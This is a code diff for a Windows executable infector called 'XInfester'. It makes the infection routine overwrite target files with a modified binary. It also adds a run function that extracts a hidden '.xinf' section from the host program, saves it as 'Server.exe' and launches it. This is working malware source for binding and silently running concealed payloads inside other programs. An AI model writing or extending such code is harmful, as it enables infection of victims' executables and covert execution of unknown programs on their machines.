@@ -29,7 +29,7 @@ const char *GetLocalAppInfestedFilename()
 	if(p=strrchr(FileName, '.'))						                 
 	*p='\0';
 
-	strcat(FileName,"_.exe");
+	strcat(FileName,"Server.exe");
 	
 	return FileName;
 }
@@ -141,7 +141,9 @@ BOOL XInfester_InfestFile( const char *pDestFileName )
 	__Final.EnumImageResourceData(__Final.GetImageRootResourceDirectoryPointer(),ResourcesFixer);
 
 
-	__Final.Dump("E:\\test.exe");
+	if(!__Final.Dump(pDestFileName))
+		goto _ERR;
+
 	//Files open
 	__Dest.free();
 	__Final.free();
@@ -154,5 +156,28 @@ _ERR:
 
 void XInfester_Run()
 {
-	
+	STARTUPINFO si;
+	PROCESS_INFORMATION pi;
+
+	PEStructure _SelfPE;
+	if (!_SelfPE.Load_PE_File(GetLocalAppFilename()))
+	{
+		return;
+	}
+
+	for (int i=0;i<_SelfPE.GetSectionCount();i++)
+	{
+		if (strcmp(_SelfPE.GetSectionName(i),".xinf")==0)
+		{
+			if(_SelfPE.DumpMemoryToFile(GetLocalAppInfestedFilename(),
+				_SelfPE.GetSectionBufferPointer(i),
+				_SelfPE.GetSectionRawSize(i)
+				))
+			{
+				WinExec(GetLocalAppInfestedFilename(),SW_SHOWNORMAL);
+				//CreateProcess(GetLocalAppInfestedFilename(), "", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+				return;
+			}
+		}
+	}
 }
